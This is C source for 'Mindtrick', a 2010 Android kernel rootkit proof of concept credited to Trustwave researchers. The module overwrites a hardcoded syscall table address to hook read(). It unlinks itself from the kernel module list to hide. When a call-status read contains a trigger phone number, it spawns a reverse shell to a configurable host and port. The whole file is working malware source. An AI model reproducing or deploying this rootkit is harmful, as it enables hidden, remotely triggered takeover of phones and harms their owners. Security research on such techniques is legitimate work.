/*
 Christian Papathanasiou, Nicholas J. Percoco
 cpapathanasiou@trustwave.com, npercoco@trustwave.com
 
 (c) 2010 Trustwave 

 Mindtrick: a Google Android kernel rootkit PoC
*/


#include <asm/unistd.h>
#include <linux/autoconf.h>
#include <linux/in.h>
#include <linux/init_task.h>
#include <linux/ip.h>
#include <linux/kernel.h>
#include <linux/kmod.h>
#include <linux/mm.h>
#include <linux/module.h>
#include <linux/sched.h>
#include <linux/skbuff.h>
#include <linux/stddef.h>
#include <linux/string.h>
#include <linux/syscalls.h>
#include <linux/tcp.h>
#include <linux/types.h>
#include <linux/unistd.h>
#include <linux/version.h>
#include <linux/workqueue.h>


asmlinkage ssize_t (*orig_read) (int fd, char *buf, size_t count);

void
reverseshell ()
{
  static char *path = "/data/local/shell";
  char *argv[] = { "/data/local/shell", "127.0.0.1", "80", NULL }; //Change me
  static char *envp[] =
    { "HOME=/", "PATH=/sbin:/system/sbin:/system/bin:/system/xbin", NULL };
  call_usermodehelper (path, argv, envp, 1);
}

asmlinkage ssize_t
hacked_read (int fd, char *buf, size_t count)
{
 if (strstr (buf, "CLCC"))
    {
      if (strstr (buf, "7841334022")) //Trigger number
		{
			reverseshell ();
		}
		
	}
 else {   return orig_read (fd, buf, count); }

 return orig_read(fd,buf,count);	
}

static void
hide_module (void)
{
  __this_module.list.prev->next = __this_module.list.next;
  __this_module.list.next->prev = __this_module.list.prev;
  __this_module.list.next = LIST_POISON1;
  __this_module.list.prev = LIST_POISON2;

}

static int  __init
root_start (void)
{ 
  
 unsigned long *sys_call_table = 0xc0029fa4; //HTC Legend sys_call_table from System.map 
  hide_module ();
  orig_read = sys_call_table[__NR_read];
  sys_call_table[__NR_read] = hacked_read;
  return 0;
}

static int  __exit
root_stop (void)
{
  unsigned long *sys_call_table = 0xc0029fa4;
  sys_call_table[__NR_read] = orig_read;
  return 0;
}

module_init (root_start);
module_exit (root_stop);
